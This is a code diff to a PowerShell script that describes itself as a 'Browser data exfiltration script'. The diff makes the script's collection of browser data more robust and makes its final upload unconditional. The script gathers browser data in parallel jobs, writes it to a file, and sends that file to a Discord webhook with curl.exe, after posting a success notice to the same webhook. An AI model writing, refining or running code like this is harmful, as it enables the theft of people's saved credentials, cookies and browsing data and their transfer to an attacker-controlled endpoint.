@@ -109,7 +109,10 @@ try {
         foreach ($dataType in $dataTypes) {
             $jobs += Start-Job -ScriptBlock {
                 param ($browser, $dataType, $outputFile)
-                Get-BrowserData -Browser $browser -DataType $dataType >> $outputFile
+                $data = Get-BrowserData -Browser $browser -DataType $dataType
+                if ($data) {
+                    Add-Content -Path $outputFile -Value $data
+                }
             } -ArgumentList $browser, $dataType, $outputFile
         }
     }
@@ -120,13 +123,17 @@ try {
     Write-Error "Failed to collect browser data: $_"
 }
 
+# Ensure output file is not empty
+if (-not (Test-Path $outputFile) -or (Get-Item $outputFile).Length -eq 0) {
+    Write-Error "No data collected. Exiting."
+    exit
+}
+
 # Send completion notification to Discord
 try {
     $body = @{ "content" = 'Browser data exfiltration script executed successfully, including browser data.' } | ConvertTo-Json
     Invoke-RestMethod -Uri $dc -Method Post -Body $body -ContentType 'application/json' -UseBasicParsing
-    if (Test-Path $outputFile) {
-        curl.exe -F "file1=@$outputFile" $dc
-    }
+    curl.exe -F "file1=@$outputFile" $dc
 } catch {
     Write-Error "Failed to send notification to Discord webhook: $_"
 }
